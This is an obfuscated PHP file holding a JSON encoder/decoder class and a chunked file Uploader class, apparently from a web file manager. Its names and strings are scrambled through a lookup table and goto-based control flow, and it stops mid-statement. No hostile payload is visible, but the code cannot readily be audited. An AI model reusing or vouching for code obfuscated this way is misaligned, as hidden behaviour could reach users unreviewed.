dÆ¹Š›ì¬: class Services_JSON { function __construct($DİÅË³ãë¡ = 0) { $this->use = $DİÅË³ãë¡; } function utf162utf8($dê«ÌˆøŠ) { $eÀĞäâ°ÊÔ =& $_SERVER[Õİõş]; if (function_exists($eÀĞäâ°ÊÔ[68])) { return mb_convert_encoding($dê«ÌˆøŠ, $eÀĞäâ°ÊÔ[1566], $eÀĞäâ°ÊÔ[1915]); } $cÍÂ–ì»‡– = ord($dê«ÌˆøŠ[0]) << 8 | ord($dê«ÌˆøŠ[1]); switch (!0) { case (127 & $cÍÂ–ì»‡–) == $cÍÂ–ì»‡–: return chr(127 & $cÍÂ–ì»‡–); case (2047 & $cÍÂ–ì»‡–) == $cÍÂ–ì»‡–: return chr(192 | $cÍÂ–ì»‡– >> 6 & 31) . chr(128 | $cÍÂ–ì»‡– & 63); case (65535 & $cÍÂ–ì»‡–) == $cÍÂ–ì»‡–: return chr(224 | $cÍÂ–ì»‡– >> 12 & 15) . chr(128 | $cÍÂ–ì»‡– >> 6 & 63) . chr(128 | $cÍÂ–ì»‡– & 63); } return $eÀĞäâ°ÊÔ[33]; } function utf82utf16($dá¦Š‰öô) { $BêÀ¼¤•º‡ =& $_SERVER[Õİõş]; if (function_exists($BêÀ¼¤•º‡[68])) { return mb_convert_encoding($dá¦Š‰öô, $BêÀ¼¤•º‡[1915], $BêÀ¼¤•º‡[1566]); } switch (strlen($dá¦Š‰öô)) { case 1: return $dá¦Š‰öô; case 2: return chr(7 & ord($dá¦Š‰öô[0]) >> 2) . chr(192 & ord($dá¦Š‰öô[0]) << 6 | 63 & ord($dá¦Š‰öô[1])); case 3: return chr(240 & ord($dá¦Š‰öô[0]) << 4 | 15 & ord($dá¦Š‰öô[1]) >> 2) . chr(192 & ord($dá¦Š‰öô[1]) << 6 | 127 & ord($dá¦Š‰öô[2])); } return $BêÀ¼¤•º‡[33]; } function encode($dóŒˆ˜Ûé´) { $D½Ü³•áÉ =& $_SERVER[Õİõş]; switch (gettype($dóŒˆ˜Ûé´)) { case $D½Ü³•áÉ[1577]: return $dóŒˆ˜Ûé´ ? $D½Ü³•áÉ[1576] : $D½Ü³•áÉ[1578]; case $D½Ü³•áÉ[1916]: return $D½Ü³•áÉ[99]; case $D½Ü³•áÉ[299]: return (int) $dóŒˆ˜Ûé´; case $D½Ü³•áÉ[274]: case $D½Ü³•áÉ[273]: return (double) $dóŒˆ˜Ûé´; case $D½Ü³•áÉ[308]: $dÓŒâšâÈê = $D½Ü³•áÉ[33]; $B‚ìë†ÆÌ = strlen($dóŒˆ˜Ûé´); for ($c‡„«´ÂÄÁ = 0; $c‡„«´ÂÄÁ < $B‚ìë†ÆÌ; ++$c‡„«´ÂÄÁ) { $cõ†Çñ¿à = ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ]); switch (!0) { case $cõ†Çñ¿à == 8: $dÓŒâšâÈê .= $D½Ü³•áÉ[1917]; break; case $cõ†Çñ¿à == 9: $dÓŒâšâÈê .= $D½Ü³•áÉ[1553]; break; case $cõ†Çñ¿à == 10: $dÓŒâšâÈê .= $D½Ü³•áÉ[1551]; break; case $cõ†Çñ¿à == 12: $dÓŒâšâÈê .= $D½Ü³•áÉ[1918]; break; case $cõ†Çñ¿à == 13: $dÓŒâšâÈê .= $D½Ü³•áÉ[1552]; break; case $cõ†Çñ¿à == 34: case $cõ†Çñ¿à == 47: case $cõ†Çñ¿à == 92: $dÓŒâšâÈê .= $D½Ü³•áÉ[93] . $dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ]; break; case $cõ†Çñ¿à >= 32 && $cõ†Çñ¿à <= 127: $dÓŒâšâÈê .= $dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ]; break; case ($cõ†Çñ¿à & 224) == 192: $aêšŞİÉ = pack($D½Ü³•áÉ[1919], $cõ†Çñ¿à, ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 1])); $c‡„«´ÂÄÁ += 1; $Bƒ“ˆÏ•Æ = $this->utf82utf16($aêšŞİÉ); $dÓŒâšâÈê .= sprintf($D½Ü³•áÉ[1920], bin2hex($Bƒ“ˆÏ•Æ)); break; case ($cõ†Çñ¿à & 240) == 224: $aêšŞİÉ = pack($D½Ü³•áÉ[1919], $cõ†Çñ¿à, ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 1]), ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 2])); $c‡„«´ÂÄÁ += 2; $Bƒ“ˆÏ•Æ = $this->utf82utf16($aêšŞİÉ); $dÓŒâšâÈê .= sprintf($D½Ü³•áÉ[1920], bin2hex($Bƒ“ˆÏ•Æ)); break; case ($cõ†Çñ¿à & 248) == 240: $aêšŞİÉ = pack($D½Ü³•áÉ[1919], $cõ†Çñ¿à, ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 1]), ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 2]), ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 3])); $c‡„«´ÂÄÁ += 3; $Bƒ“ˆÏ•Æ = $this->utf82utf16($aêšŞİÉ); $dÓŒâšâÈê .= sprintf($D½Ü³•áÉ[1920], bin2hex($Bƒ“ˆÏ•Æ)); break; case ($cõ†Çñ¿à & 252) == 248: $aêšŞİÉ = pack($D½Ü³•áÉ[1919], $cõ†Çñ¿à, ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 1]), ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 2]), ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 3]), ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 4])); $c‡„«´ÂÄÁ += 4; $Bƒ“ˆÏ•Æ = $this->utf82utf16($aêšŞİÉ); $dÓŒâšâÈê .= sprintf($D½Ü³•áÉ[1920], bin2hex($Bƒ“ˆÏ•Æ)); break; case ($cõ†Çñ¿à & 254) == 252: $aêšŞİÉ = pack($D½Ü³•áÉ[1919], $cõ†Çñ¿à, ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 1]), ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 2]), ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 3]), ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 4]), ord($dóŒˆ˜Ûé´[$c‡„«´ÂÄÁ + 5])); $c‡„«´ÂÄÁ += 5; $Bƒ“ˆÏ•Æ = $this->utf82utf16($aêšŞİÉ); $dÓŒâšâÈê .= sprintf($D½Ü³•áÉ[1920], bin2hex($Bƒ“ˆÏ•Æ)); break; } } return $D½Ü³•áÉ[112] . $dÓŒâšâÈê . $D½Ü³•áÉ[112]; case $D½Ü³•áÉ[1921]: if (is_array($dóŒˆ˜Ûé´) && count($dóŒˆ˜Ûé´) && array_keys($dóŒˆ˜Ûé´) !== range(0, sizeof($dóŒˆ˜Ûé´) - 1)) { $dÚµÃÍŠ¶¤ = array_map(array($this, $D½Ü³•áÉ[1922]), array_keys($dóŒˆ˜Ûé´), array_values($dóŒˆ˜Ûé´)); foreach ($dÚµÃÍŠ¶¤ as $EŒÎ‡Ìéß±) { if (Services_JSON::isError($EŒÎ‡Ìéß±)) { return $EŒÎ‡Ìéß±; } } return $D½Ü³•áÉ[1071] . join($D½Ü³•áÉ[47], $dÚµÃÍŠ¶¤) . $D½Ü³•áÉ[311]; } $C«ÅÊÏŠŒ² = array_map(array($this, $D½Ü³•áÉ[1923]), $dóŒˆ˜Ûé´); foreach ($C«ÅÊÏŠŒ² as $b°å¬òº›) { if (Services_JSON::isError($b°å¬òº›)) { return $b°å¬òº›; } } return $D½Ü³•áÉ[153] . join($D½Ü³•áÉ[47], $C«ÅÊÏŠŒ²) . $D½Ü³•áÉ[471]; case $D½Ü³•áÉ[1924]: $dï¥¤£Í×˜ = get_object_vars($dóŒˆ˜Ûé´); $dÚµÃÍŠ¶¤ = array_map(array($this, $D½Ü³•áÉ[1922]), array_keys($dï¥¤£Í×˜), array_values($dï¥¤£Í×˜)); foreach ($dÚµÃÍŠ¶¤ as $EŒÎ‡Ìéß±) { if (Services_JSON::isError($EŒÎ‡Ìéß±)) { return $EŒÎ‡Ìéß±; } } return $D½Ü³•áÉ[1071] . join($D½Ü³•áÉ[47], $dÚµÃÍŠ¶¤) . $D½Ü³•áÉ[311]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $D½Ü³•áÉ[99] : new Services_JSON_Error(gettype($dóŒˆ˜Ûé´) . $D½Ü³•áÉ[1925]); } } function name_value($Dæ¡Òô‚’…, $c¼Á®ê©¹Ê) { $EÇ¾ÂİÂ¬È = $this->encode($c¼Á®ê©¹Ê); if (Services_JSON::isError($EÇ¾ÂİÂ¬È)) { return $EÇ¾ÂİÂ¬È; } return $this->encode(strval($Dæ¡Òô‚’…)) . $_SERVER[Õİõş][4] . $EÇ¾ÂİÂ¬È; } function reduce_string($bè¬Í‘›á•) { $DèŸªÀÈà =& $_SERVER[Õİõş]; $bè¬Í‘›á• = preg_replace(array($DèŸªÀÈà[1926], $DèŸªÀÈà[1927], $DèŸªÀÈà[1928]), $DèŸªÀÈà[33], $bè¬Í‘›á•); return trim($bè¬Í‘›á•); } function decode($B…È®áÊ™) { $e®È¥ÖäË³ =& $_SERVER[Õİõş]; $B…È®áÊ™ = $this->reduce_string($B…È®áÊ™); switch (strtolower($B…È®áÊ™)) { case $e®È¥ÖäË³[1576]: return !0; case $e®È¥ÖäË³[1578]: return !1; case $e®È¥ÖäË³[99]: return null; default: $aãŒåİ¼»İ = array(); if (is_numeric($B…È®áÊ™)) { return (double) $B…È®áÊ™ == (int) $B…È®áÊ™ ? (int) $B…È®áÊ™ : (double) $B…È®áÊ™; } elseif (preg_match($e®È¥ÖäË³[1929], $B…È®áÊ™, $aãŒåİ¼»İ) && $aãŒåİ¼»İ[1] == $aãŒåİ¼»İ[2]) { $AÃĞ„Ü„“õ = substr($B…È®áÊ™, 0, 1); $fÍ–å©Ï®‹ = substr($B…È®áÊ™, 1, -1); $AõÎíùÅÛ = $e®È¥ÖäË³[33]; $eïÄ´ã ùâ = strlen($fÍ–å©Ï®‹); for ($dô£ˆ¹—±° = 0; $dô£ˆ¹—±° < $eïÄ´ã ùâ; ++$dô£ˆ¹—±°) { $EÛ¬î¯áŒª = substr($fÍ–å©Ï®‹, $dô£ˆ¹—±°, 2); $Cé— ¸ĞŠ¶ = ord($fÍ–å©Ï®‹[$dô£ˆ¹—±°]); switch (!0) { case $EÛ¬î¯áŒª == $e®È¥ÖäË³[1917]: $AõÎíùÅÛ .= chr(8); ++$dô£ˆ¹—±°; break; case $EÛ¬î¯áŒª == $e®È¥ÖäË³[1553]: $AõÎíùÅÛ .= chr(9); ++$dô£ˆ¹—±°; break; case $EÛ¬î¯áŒª == $e®È¥ÖäË³[1551]: $AõÎíùÅÛ .= chr(10); ++$dô£ˆ¹—±°; break; case $EÛ¬î¯áŒª == $e®È¥ÖäË³[1918]: $AõÎíùÅÛ .= chr(12); ++$dô£ˆ¹—±°; break; case $EÛ¬î¯áŒª == $e®È¥ÖäË³[1552]: $AõÎíùÅÛ .= chr(13); ++$dô£ˆ¹—±°; break; case $EÛ¬î¯áŒª == $e®È¥ÖäË³[1337]: case $EÛ¬î¯áŒª == $e®È¥ÖäË³[1930]: case $EÛ¬î¯áŒª == $e®È¥ÖäË³[1546]: case $EÛ¬î¯áŒª == $e®È¥ÖäË³[1548]: if ($AÃĞ„Ü„“õ == $e®È¥ÖäË³[112] && $EÛ¬î¯áŒª != $e®È¥ÖäË³[1930] || $AÃĞ„Ü„“õ == $e®È¥ÖäË³[55] && $EÛ¬î¯áŒª != $e®È¥ÖäË³[1337]) { $AõÎíùÅÛ .= $fÍ–å©Ï®‹[++$dô£ˆ¹—±°]; } break; case preg_match($e®È¥ÖäË³[1931], substr($fÍ–å©Ï®‹, $dô£ˆ¹—±°, 6)): $a‚öáø¼ƒ = chr(hexdec(substr($fÍ–å©Ï®‹, $dô£ˆ¹—±° + 2, 2))) . chr(hexdec(substr($fÍ–å©Ï®‹, $dô£ˆ¹—±° + 4, 2))); $AõÎíùÅÛ .= $this->utf162utf8($a‚öáø¼ƒ); $dô£ˆ¹—±° += 5; break; case $Cé— ¸ĞŠ¶ >= 32 && $Cé— ¸ĞŠ¶ <= 127: $AõÎíùÅÛ .= $fÍ–å©Ï®‹[$dô£ˆ¹—±°]; break; case ($Cé— ¸ĞŠ¶ & 224) == 192: $AõÎíùÅÛ .= substr($fÍ–å©Ï®‹, $dô£ˆ¹—±°, 2); ++$dô£ˆ¹—±°; break; case ($Cé— ¸ĞŠ¶ & 240) == 224: $AõÎíùÅÛ .= substr($fÍ–å©Ï®‹, $dô£ˆ¹—±°, 3); $dô£ˆ¹—±° += 2; break; case ($Cé— ¸ĞŠ¶ & 248) == 240: $AõÎíùÅÛ .= substr($fÍ–å©Ï®‹, $dô£ˆ¹—±°, 4); $dô£ˆ¹—±° += 3; break; case ($Cé— ¸ĞŠ¶ & 252) == 248: $AõÎíùÅÛ .= substr($fÍ–å©Ï®‹, $dô£ˆ¹—±°, 5); $dô£ˆ¹—±° += 4; break; case ($Cé— ¸ĞŠ¶ & 254) == 252: $AõÎíùÅÛ .= substr($fÍ–å©Ï®‹, $dô£ˆ¹—±°, 6); $dô£ˆ¹—±° += 5; break; } } return $AõÎíùÅÛ; } elseif (preg_match($e®È¥ÖäË³[1932], $B…È®áÊ™) || preg_match($e®È¥ÖäË³[1933], $B…È®áÊ™)) { goto E³™¥™¥ó¡; a¡õÁôŒ¾: for ($dô£ˆ¹—±° = 0; $dô£ˆ¹—±° <= $eïÄ´ã ùâ; ++$dô£ˆ¹—±°) { $dÚÏ³¸ùà = end($F›‚Ï«Îñ±); $EÛ¬î¯áŒª = substr($fÍ–å©Ï®‹, $dô£ˆ¹—±°, 2); if ($dô£ˆ¹—±° == $eïÄ´ã ùâ || $fÍ–å©Ï®‹[$dô£ˆ¹—±°] == $e®È¥ÖäË³[47] && $dÚÏ³¸ùà[$e®È¥ÖäË³[1934]] == SERVICES_JSON_SLICE) { $CíâíïÖé– = substr($fÍ–å©Ï®‹, $dÚÏ³¸ùà[$e®È¥ÖäË³[259]], $dô£ˆ¹—±° - $dÚÏ³¸ùà[$e®È¥ÖäË³[259]]); array_push($F›‚Ï«Îñ±, array($e®È¥ÖäË³[1934] => SERVICES_JSON_SLICE, $e®È¥ÖäË³[259] => $dô£ˆ¹—±° + 1, $e®È¥ÖäË³[1935] => !1)); if (reset($F›‚Ï«Îñ±) == SERVICES_JSON_IN_ARR) { array_push($câŞùÑ¬Ğ, $this->decode($CíâíïÖé–)); } elseif (reset($F›‚Ï«Îñ±) == SERVICES_JSON_IN_OBJ) { $däÜ•ïÄ½ = array(); if (preg_match($e®È¥ÖäË³[1936], $CíâíïÖé–, $däÜ•ïÄ½)) { $a±Ä„‡Ş£ = $this->decode($däÜ•ïÄ½[1]); $a†ì¬°ßˆ = $this->decode($däÜ•ïÄ½[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $e™ñ¹¯”š©[$a±Ä„‡Ş£] = $a†ì¬°ßˆ; } else { $e™ñ¹¯”š©->{$a±Ä„‡Ş£} = $a†ì¬°ßˆ; } } elseif (preg_match($e®È¥ÖäË³[1937], $CíâíïÖé–, $däÜ•ïÄ½)) { $a±Ä„‡Ş£ = $däÜ•ïÄ½[1]; $a†ì¬°ßˆ = $this->decode($däÜ•ïÄ½[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $e™ñ¹¯”š©[$a±Ä„‡Ş£] = $a†ì¬°ßˆ; } else { $e™ñ¹¯”š©->{$a±Ä„‡Ş£} = $a†ì¬°ßˆ; } } } } elseif (($fÍ–å©Ï®‹[$dô£ˆ¹—±°] == $e®È¥ÖäË³[112] || $fÍ–å©Ï®‹[$dô£ˆ¹—±°] == $e®È¥ÖäË³[55]) && $dÚÏ³¸ùà[$e®È¥ÖäË³[1934]] != SERVICES_JSON_IN_STR) { array_push($F›‚Ï«Îñ±, array($e®È¥ÖäË³[1934] => SERVICES_JSON_IN_STR, $e®È¥ÖäË³[259] => $dô£ˆ¹—±°, $e®È¥ÖäË³[1935] => $fÍ–å©Ï®‹[$dô£ˆ¹—±°])); } elseif ($fÍ–å©Ï®‹[$dô£ˆ¹—±°] == $dÚÏ³¸ùà[$e®È¥ÖäË³[1935]] && $dÚÏ³¸ùà[$e®È¥ÖäË³[1934]] == SERVICES_JSON_IN_STR && (strlen(substr($fÍ–å©Ï®‹, 0, $dô£ˆ¹—±°)) - strlen(rtrim(substr($fÍ–å©Ï®‹, 0, $dô£ˆ¹—±°), $e®È¥ÖäË³[93]))) % 2 != 1) { array_pop($F›‚Ï«Îñ±); } elseif ($fÍ–å©Ï®‹[$dô£ˆ¹—±°] == $e®È¥ÖäË³[153] && in_array($dÚÏ³¸ùà[$e®È¥ÖäË³[1934]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($F›‚Ï«Îñ±, array($e®È¥ÖäË³[1934] => SERVICES_JSON_IN_ARR, $e®È¥ÖäË³[259] => $dô£ˆ¹—±°, $e®È¥ÖäË³[1935] => !1)); } elseif ($fÍ–å©Ï®‹[$dô£ˆ¹—±°] == $e®È¥ÖäË³[471] && $dÚÏ³¸ùà[$e®È¥ÖäË³[1934]] == SERVICES_JSON_IN_ARR) { array_pop($F›‚Ï«Îñ±); } elseif ($fÍ–å©Ï®‹[$dô£ˆ¹—±°] == $e®È¥ÖäË³[1071] && in_array($dÚÏ³¸ùà[$e®È¥ÖäË³[1934]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($F›‚Ï«Îñ±, array($e®È¥ÖäË³[1934] => SERVICES_JSON_IN_OBJ, $e®È¥ÖäË³[259] => $dô£ˆ¹—±°, $e®È¥ÖäË³[1935] => !1)); } elseif ($fÍ–å©Ï®‹[$dô£ˆ¹—±°] == $e®È¥ÖäË³[311] && $dÚÏ³¸ùà[$e®È¥ÖäË³[1934]] == SERVICES_JSON_IN_OBJ) { array_pop($F›‚Ï«Îñ±); } elseif ($EÛ¬î¯áŒª == $e®È¥ÖäË³[1938] && in_array($dÚÏ³¸ùà[$e®È¥ÖäË³[1934]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($F›‚Ï«Îñ±, array($e®È¥ÖäË³[1934] => SERVICES_JSON_IN_CMT, $e®È¥ÖäË³[259] => $dô£ˆ¹—±°, $e®È¥ÖäË³[1935] => !1)); $dô£ˆ¹—±°++; } elseif ($EÛ¬î¯áŒª == $e®È¥ÖäË³[1939] && $dÚÏ³¸ùà[$e®È¥ÖäË³[1934]] == SERVICES_JSON_IN_CMT) { array_pop($F›‚Ï«Îñ±); $dô£ˆ¹—±°++; for ($C˜½À«‹á = $dÚÏ³¸ùà[$e®È¥ÖäË³[259]]; $C˜½À«‹á <= $dô£ˆ¹—±°; ++$C˜½À«‹á) { $fÍ–å©Ï®‹ = substr_replace($fÍ–å©Ï®‹, $e®È¥ÖäË³[50], $C˜½À«‹á, 1); } } } if (reset($F›‚Ï«Îñ±) == SERVICES_JSON_IN_ARR) { return $câŞùÑ¬Ğ; } elseif (reset($F›‚Ï«Îñ±) == SERVICES_JSON_IN_OBJ) { return $e™ñ¹¯”š©; } goto dÉƒ¿¬°˜; E³™¥™¥ó¡: if ($B…È®áÊ™[0] == $e®È¥ÖäË³[153]) { $F›‚Ï«Îñ± = array(SERVICES_JSON_IN_ARR); $câŞùÑ¬Ğ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $F›‚Ï«Îñ± = array(SERVICES_JSON_IN_OBJ); $e™ñ¹¯”š© = array(); } else { $F›‚Ï«Îñ± = array(SERVICES_JSON_IN_OBJ); $e™ñ¹¯”š© = new stdClass(); } } array_push($F›‚Ï«Îñ±, array($e®È¥ÖäË³[1934] => SERVICES_JSON_SLICE, $e®È¥ÖäË³[259] => 0, $e®È¥ÖäË³[1935] => !1)); $fÍ–å©Ï®‹ = substr($B…È®áÊ™, 1, -1); goto aÍÏ˜íÚ÷•; aÍÏ˜íÚ÷•: $fÍ–å©Ï®‹ = $this->reduce_string($fÍ–å©Ï®‹); if ($fÍ–å©Ï®‹ == $e®È¥ÖäË³[33]) { if (reset($F›‚Ï«Îñ±) == SERVICES_JSON_IN_ARR) { return $câŞùÑ¬Ğ; } else { return $e™ñ¹¯”š©; } } $eïÄ´ã ùâ = strlen($fÍ–å©Ï®‹); goto a¡õÁôŒ¾; dÉƒ¿¬°˜: } } } function isError($A§ÂÜÔ©æ†, $E¨µÀª°ßÖ = null) { $A–İñ§”£‚ =& $_SERVER[Õİõş]; if (class_exists($A–İñ§”£‚[1940])) { return PEAR::isError($A§ÂÜÔ©æ†, $E¨µÀª°ßÖ); } elseif (is_object($A§ÂÜÔ©æ†) && (get_class($A§ÂÜÔ©æ†) == $A–İñ§”£‚[1941] || is_subclass_of($A§ÂÜÔ©æ†, $A–İñ§”£‚[1941]))) { return !0; } return !1; } } if (class_exists($_SERVER[Õİõş][1942])) { class Services_JSON_Error extends PEAR_Error { function __construct($EƒÔ‚‡ßÓ° = "\165\156\153\156\x6f\167\x6e\x20\x65\162\x72\157\x72", $DÊ½‚áñ¾ = null, $F‚ø„ºÛ«á = null, $EãØÆìë = null, $f´¢›í—” = null) { parent::PEAR_Error($EƒÔ‚‡ßÓ°, $DÊ½‚áñ¾, $F‚ø„ºÛ«á, $EãØÆìë, $f´¢›í—”); } } } else { class Services_JSON_Error { function __construct($aĞ‰É‘´ğÌ = "\165\x6e\x6b\x6e\157\x77\x6e\40\145\x72\162\x6f\162", $e ¬»Å£©… = null, $Eì£Úªì®Õ = null, $B’±èÊäùÄ = null, $c»ù±ßå²² = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto cæÍÓ¸ÌŸ; cæÍÓ¸ÌŸ: $fŒğºãßç— =& $_SERVER[Õİõş]; global $in; $this->in =& $in; goto e‘—ŒäÍ±é; e³ªÍ³„£›: $this->checkSize(); $this->tempPathInit(); goto e°èø«ˆğ¯; e‘—ŒäÍ±é: if (!empty($_FILES)) { $BŒñ¿Í¼ÈÀ = $_FILES[$fŒğºãßç—[163]]; $this->uploadFile = $BŒñ¿Í¼ÈÀ[$fŒğºãßç—[1943]]; if (!$this->uploadFile && $BŒñ¿Í¼ÈÀ[$fŒğºãßç—[1214]] > 0) { show_json($this->errorInfo($BŒñ¿Í¼ÈÀ[$fŒğºãßç—[1214]]), !1); } } else { if (isset($in[$fŒğºãßç—[382]])) { $this->uploadFile = isset($in[$fŒğºãßç—[1944]]) ? $fŒğºãßç—[1945] : $fŒğºãßç—[1790]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto e³ªÍ³„£›; e°èø«ˆğ¯: } public function upload() { goto Eã„¥©´İ¦; EøºÎ¿Ù¯§: @unlink($E×…¤”øº²); if (!$CãìœùŒğ’) { $this->showJson($BùéØ±Øæ®[1954] . $a¸…ÌŸÙÒ, !1); } $A·ßîì¢ØÜ[$BùéØ±Øæ®[1955]] = $f™­©ØÓŞâ; goto eŞÆÔ¹¿àƒ; a£¥ôè¶¤¬: $c¥ËêÎÁø› = $a¸…ÌŸÙÒ * $B¹ŒâÎ§é; $cì¼Ü†š»Ê = @fopen($this->tempFile, $BùéØ±Øæ®[1953]); fseek($cì¼Ü†š»Ê, $c¥ËêÎÁø›); goto Aîö†š¸´; déÀ´óõ›®: CacheLock::lock($this->tempFile, 20); $A·ßîì¢ØÜ = $this->statusGet(); $this->initFileTemp(); goto c¹ÄéÌª£Ú; c¹ÄéÌª£Ú: $E×…¤”øº² = $this->moveUploadedFile($D“Û…¥©ã); if ($fÚ•ßŞÙ©³ > 0 && filesize($E×…¤”øº²) == 0) { $this->showJson($BùéØ±Øæ®[1951], !1); } if (!$E×…¤”øº²) { $this->showJson(LNG($BùéØ±Øæ®[1952]), !1); } goto a£¥ôè¶¤¬; C„ŠŠ¼ÒÆ•: if ($f™­©ØÓŞâ > 1 && $B¹ŒâÎ§é <= 0) { show_json($BùéØ±Øæ®[1950], !1); } if ($B¹ŒâÎ§é > $fÚ•ßŞÙ©³) { $f™­©ØÓŞâ = 1; } if ($f™­©ØÓŞâ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto déÀ´óõ›®; Eã„¥©´İ¦: $BùéØ±Øæ® =& $_SERVER[Õİõş]; $a¸…ÌŸÙÒ = isset($this->in[$BùéØ±Øæ®[1946]]) ? intval($this->in[$BùéØ±Øæ®[1946]]) : 0; $f™­©ØÓŞâ = isset($this->in[$BùéØ±Øæ®[1947]]) ? intval($this->in[$BùéØ±Øæ®[1947]]) : 1; goto eÚÙîÍÆ×; BÚÅÄö•Â: ignore_timeout(); if (!$this->checkChunkHash($A·ßîì¢ØÜ)) { $this->showJson($BùéØ±Øæ®[1960], !1); } $this->statusSet(!1); goto díºĞ¿Î¤á; Aîö†š¸´: $CãìœùŒğ’ = $this->writeTo($E×…¤”øº², $cì¼Ü†š»Ê, $this->tempFile); $EÖ×»Ñ®Ô’ = IO::hashSimple($E×…¤”øº²); $fÚ•ßŞÙ©³ = IO::size($E×…¤”øº²); goto EøºÎ¿Ù¯§; eŞÆÔ¹¿àƒ: $A·ßîì¢ØÜ[$BùéØ±Øæ®[1956]][$BùéØ±Øæ®[1957] . $a¸…ÌŸÙÒ] = array($BùéØ±Øæ®[1958] => $c¥ËêÎÁø›, $BùéØ±Øæ®[1039] => $a¸…ÌŸÙÒ, $BùéØ±Øæ®[77] => $fÚ•ßŞÙ©³, $BùéØ±Øæ®[160] => $EÖ×»Ñ®Ô’); $this->statusSet($A·ßîì¢ØÜ); if (count($A·ßîì¢ØÜ[$BùéØ±Øæ®[1956]]) != $A·ßîì¢ØÜ[$BùéØ±Øæ®[1955]]) { $this->showJson($BùéØ±Øæ®[1959] . $a¸…ÌŸÙÒ, !0); } goto BÚÅÄö•Â; eÚÙîÍÆ×: $D“Û…¥©ã = $this->tempFile . $BùéØ±Øæ®[1948] . $a¸…ÌŸÙÒ; $fÚ•ßŞÙ©³ = isset($this->in[$BùéØ±Øæ®[515]]) ? intval($this->in[$BùéØ±Øæ®[515]]) : 0; $B¹ŒâÎ§é = isset($this->in[$BùéØ±Øæ®[1949]]) ? intval($this->in[$BùéØ±Øæ®[1949]]) : 0; goto C„ŠŠ¼ÒÆ•; díºĞ¿Î¤á: CacheLock::unlock($this->tempFile); return $this->tempFile; goto fˆ´ßĞ•„—; fˆ´ßĞ•„—: } private function checkSize() { $A¤›†›½Ù =& $_SERVER[Õİõş]; if (phpBuild64() || $this->in[$A¤›†›½Ù[77]] < PHP_INT_MAX) { return; } show_json(LNG($A¤›†›½Ù[1961]), !1); } private function showJson($Bƒã¤ô¦¬, $b¾Ä­‘ã·) { CacheLock::unlock($this->tempFile); if (!$b¾Ä­‘ã·) { return show_json($Bƒã¤ô¦¬, $b¾Ä­‘ã·); } show_json($Bƒã¤ô¦¬, $b¾Ä­‘ã·); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto Eñ‚…¦…; Eáã‹°Øó”: $this->tempFile = $c§ô©’‘˜ . $AŞ‰ÜîØ³ß[1964] . md5($fÒé•×ƒ›÷ . $this->in[$AŞ‰ÜîØ³ß[1508]]); goto E™â²ƒˆƒâ; D¥è‰ò‰ÙÔ: touch($c§ô©’‘˜ . $AŞ‰ÜîØ³ß[1962]); $fÒé•×ƒ›÷ = isset($this->in[$AŞ‰ÜîØ³ß[1963]]) ? $this->in[$AŞ‰ÜîØ³ß[1963]] : !1; if (strlen($fÒé•×ƒ›÷) < 30) { $fÒé•×ƒ›÷ = md5(USER_ID . $this->in[$AŞ‰ÜîØ³ß[75]] . $this->fileName . $this->in[$AŞ‰ÜîØ³ß[77]]); } goto Eáã‹°Øó”; Eñ‚…¦…: $AŞ‰ÜîØ³ß =& $_SERVER[Õİõş]; $c§ô©’‘˜ = TEMP_FILES; @mk_dir($c§ô©’‘˜); goto D¥è‰ò‰ÙÔ; E™â²ƒˆƒâ: } private function moveUploadedFile($f¡¶ÛÊ¤‰é) { $dàè‚Ûö„ =& $_SERVER[Õİõş]; $f“¼†î˜‘ = $this->uploadFile; if ($f“¼†î˜‘ == $dàè‚Ûö„[1965]) { @file_put_contents($f¡¶ÛÊ¤‰é, base64_decode($_REQUEST[$dàè‚Ûö„[1966]])); } else { if ($f“¼†î˜‘ == $dàè‚Ûö„[1790]) { $f©ê›Š‰ = @fopen($f¡¶ÛÊ¤‰é, $dàè‚Ûö„[1497]); $this->writeTo($f“¼†î˜‘, $f©ê›Š‰, $f¡¶ÛÊ¤‰é); } else { if (!move_uploaded_file($f“¼†î˜‘, $f¡¶ÛÊ¤‰é)) { return !1; } } } return $f¡¶ÛÊ¤‰é; } private function writeTo($eÛËõ”ØÔ¼, $bµô·Ä‰ô†, $C£ÇŞ¶‹øÅ) { goto aêÊ…õµó³; aêÊ…õµó³: $fÔåà¹Œ³– =& $_SERVER[Õİõş]; $Fİ‘Á¹œ‡¬ = $fÔåà¹Œ³–[1967] . $C£ÇŞ¶‹øÅ; $AŠ‰ƒ÷ˆÜ… = CacheLock::lock($Fİ‘Á¹œ‡¬, 1); goto CÉ¥°í¦º—; CÉ¥°í¦º—: $F®¨ªõå•¡ = @fopen($eÛËõ”ØÔ¼, $fÔåà¹Œ³–[1496]); if 